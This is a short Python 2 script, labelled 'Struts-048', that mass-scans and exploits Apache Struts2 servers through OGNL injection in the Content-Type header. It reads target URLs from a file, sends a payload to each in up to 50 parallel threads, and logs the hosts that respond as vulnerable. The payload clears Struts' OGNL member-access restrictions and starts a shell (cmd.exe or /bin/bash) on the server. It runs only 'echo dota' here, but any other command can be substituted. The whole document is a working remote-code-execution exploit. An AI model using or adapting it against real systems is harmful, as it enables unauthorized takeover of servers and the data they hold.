# -*- encoding: utf-8 -*-
# !/usr/bin/env python
# desc: Struts-048
# link: http://bobao.360.cn/learning/detail/4078.html

import urllib2
from poster.encode import multipart_encode
from poster.streaminghttp import register_openers
import threading
def poc(url):
    register_openers()
    datagen, header = multipart_encode({"image1": open("tmp.txt", "rb")})
    header["User-Agent"]="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
    header["Content-Type"]="%{(#szgx='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo dota').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.close())}"
    try:
        request = urllib2.Request(url,datagen,headers=header)
        response = urllib2.urlopen(request,timeout=5)
        body=response.read()
    except:
        body=""
    if "dota" in body:
        print "[*]发现Struts 048漏洞，地址为:",url
        f.write(url+"\n")
if __name__=="__main__":
    f=open("result.txt","a")
    url_list=[i.replace("\n","") for i in open("url.txt","r").readlines()]
    for url in url_list:
        threading.Thread(target=poc,args=(url,)).start()
        while 1:
            if(len(threading.enumerate())<50):
                break